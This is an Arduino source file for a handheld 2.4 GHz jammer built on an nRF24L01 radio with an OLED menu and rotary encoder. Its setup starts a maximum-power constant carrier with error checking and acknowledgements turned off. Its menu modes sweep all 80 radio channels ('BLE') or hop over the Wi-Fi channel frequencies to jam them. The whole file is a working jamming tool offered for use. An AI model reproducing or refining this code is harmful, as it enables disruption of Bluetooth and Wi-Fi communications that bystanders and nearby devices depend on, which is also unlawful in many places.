#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1 //or set to the pin you wired to RST

//Rotary encoder pins
#define CLK 3
#define DT 4
#define SW 5

//Height of the yellow zone
#define HEADER_HEIGHT 16

//Menu
const char *menuItems[] = {"BLE (Hold button)", "Just Wi-Fi", "Deactivate"};
const int menuLength = 3;
int selectedItem = 0;

//Encoder state
int lastCLKState;
unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 3; //ms

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
RF24 radio(9, 10); //CE, CSN
byte i = 45;
const int wifiFrequencies[] = {2412, 2417, 2422, 2427, 2432, 2437, 2442, 2447, 2452, 2457, 2462};

void fullAttack() {
  for (size_t i = 0; i < 80; i++) {
    radio.setChannel(i);
  }
}

void wifiAttack() {
  for (int i = 0; i < sizeof(wifiFrequencies) / sizeof(wifiFrequencies[0]); i++) {
    radio.setChannel(wifiFrequencies[i] - 2400);
  }
}

//Rotary encoder handler with debounce
void handleEncoder() {
  int currentCLKState = digitalRead(CLK);

  //Only check when CLK changes (transition)
  if (currentCLKState != lastCLKState && millis() - lastDebounceTime > debounceDelay) {
    if (digitalRead(DT) != currentCLKState) {
      selectedItem = (selectedItem + 1) % menuLength; //CW
    } else {
      selectedItem = (selectedItem - 1 + menuLength) % menuLength; //CCW
    }
    drawMenu();
    lastDebounceTime = millis();
  }

  lastCLKState = currentCLKState;
}

//Button press (with debounce)
void handleButton() {
  //static unsigned long lastButtonTime = 0;
  //if (digitalRead(SW) == LOW && millis() - lastButtonTime > 1000) {
  if (digitalRead(SW) == LOW) {
    executeAction(selectedItem);
    //lastButtonTime = millis();
  }
}

//Draw menu
void drawMenu() {
  display.clearDisplay();
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.setTextColor(SSD1306_WHITE);
  display.println("Device active");

  for (int i = 0; i < menuLength; i++) {
    int y = HEADER_HEIGHT + i * 12;//offset menu by 16px down
    if (i == selectedItem) {
      display.fillRect(0, y, SCREEN_WIDTH, 12, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(2, y);
    display.println(menuItems[i]);
  }

  display.display();
}

//Actions
void executeAction(int item) {
  switch (item) {
    case 0:
      fullAttack();
      break;
    case 1:
      wifiAttack();
      break;
    case 2: break;
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(CLK, INPUT_PULLUP);
  pinMode(DT, INPUT_PULLUP);
  pinMode(SW, INPUT_PULLUP);
  Wire.begin();

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // 0x3C or 0x3D
    Serial.println("SSD1306 allocation failed");
    for (;;);
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("Hello!");
  display.display();
  delay(1000);
  if (radio.begin()) {
    delay(200);
    lastCLKState = digitalRead(CLK);
    radio.setAutoAck(false); 
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
    display.clearDisplay();
    display.setCursor(0,20);
    display.println("Jammer got up!");
    display.display();
    delay(4000);
    drawMenu();
  } else {
    Serial.println("BLE Jammer couldn't be started!");
    display.clearDisplay();
    display.setCursor(0,20);
    display.println("Jammer Error!");
    display.display();
  }
}

void loop() {
  handleEncoder();
  handleButton();
}
